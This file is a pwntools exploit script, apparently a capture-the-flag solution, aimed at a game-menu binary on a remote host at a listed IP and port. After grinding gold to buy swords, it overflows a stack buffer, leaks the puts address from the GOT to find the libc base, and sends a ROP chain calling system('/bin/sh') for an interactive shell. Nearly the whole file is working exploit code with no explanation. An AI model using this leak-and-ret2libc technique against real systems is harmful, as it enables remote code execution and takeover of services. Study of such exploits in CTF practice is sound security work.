from pwn import * 
from pwn import p64,u64
from LibcSearcher import *

debug = 0
gdb_is = 0
elf_path = "./pwn"
# context(arch='i386',os = 'linux')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['wt.exe','nt','Ubuntu','-c']
    if gdb_is:
        # r = gdb.debug(elf_path,'set debug-file-directory ./.debug/')
        r = process(elf_path)
        gdb.attach(r)
        # gdb.attach(r)
        # pause()
        pass
    else:
        r = process(elf_path)
    
else:
    host = "39.106.48.123:26764"
    r = connect(host.split(':')[0],host.split(':')[1])#远程连接
    gdb_is =0



def show_addr(name,addr):
      success(f'{name} = {hex(addr)}')

def revc_addr(name:str, until:bytes =b'\x7f',offset:int = 0,addrType:str = 'bytes')->int:
    if type(until) == str:
        until = until.encode()
    if addrType == 'bytes':
        if not offset:
            addr = u64(r.recvuntil(until)[-6:].ljust(8,b'\x00'))
        else:
            addr = u64(r.recvuntil(until)[:offset].ljust(8,b'\x00'))
    elif addrType == 'str':
        addr = int(r.recvuntil(until)[2:offset].decode(),16)

    show_addr(name,addr)
    return addr

libc = ELF('./libc-2.31.so')
elf = ELF(elf_path)
rop = ROP(elf)

def menu(choice):
    r.sendlineafter(b'> ',str(choice).encode())

def attack(choice):
    menu(2)
    r.sendlineafter(b'What kind of monster do you want to fight?\n',str(choice).encode())
    # 0 You gain 10 gold and 5 experience. 被打2点
def healing():
    menu(6)
    r.sendlineafter(b'> ',b'2')
    r.sendlineafter(b'> ',b'3')
def buy_sword():
    menu(6)
    r.sendlineafter(b'> ',b'1')
    r.sendlineafter(b'> ',b'3')

for i in range(120):
    attack(0)
for i in range(5):
    buy_sword()
attack(2)




payload = b'A' * 0x650 + b'junkjunk' 
rop.raw(payload)
rop.puts(elf.got['puts'])
rop.raw(p64(0x401749))
info(rop.dump())
r.sendline(rop.chain())
libc.address = revc_addr('puts') - libc.sym['puts']
show_addr('libc.address',libc.address)
binsh = libc.address + 0x001B45BD
rop = ROP(libc)
r.sendlineafter(b'What kind of monster do you want to fight?\n',str(2).encode())
pause()
payload = b'A' * 0x650 + b'junkjunk' + p64(0x000000401a3b) + p64(binsh) +p64(0x0401016)+ p64(libc.sym['system'])
rop.raw(payload)
r.sendline(rop.chain())
show_addr('libc.address',libc.address)

r.interactive()